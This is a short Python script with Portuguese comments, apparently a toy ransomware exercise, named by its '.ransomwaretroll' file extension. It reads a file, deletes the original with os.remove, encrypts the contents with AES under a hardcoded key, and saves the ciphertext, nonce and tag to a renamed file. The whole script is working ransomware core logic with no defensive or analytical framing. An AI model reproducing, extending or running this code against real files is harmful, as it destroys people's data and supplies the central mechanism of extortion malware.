import os
import Cryptodome.Cipher.AES as AES

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
with open(file_name, 'rb') as f:
    conteudo_arq = f.read()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"chave_secreta_cr"
cipher = AES.new(key, AES.MODE_EAX)

## criptografar o arquivo
ciphertext, tag = cipher.encrypt_and_digest(conteudo_arq)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
[ new_file.write(x) for x in (cipher.nonce, tag, ciphertext) ]
new_file.close()
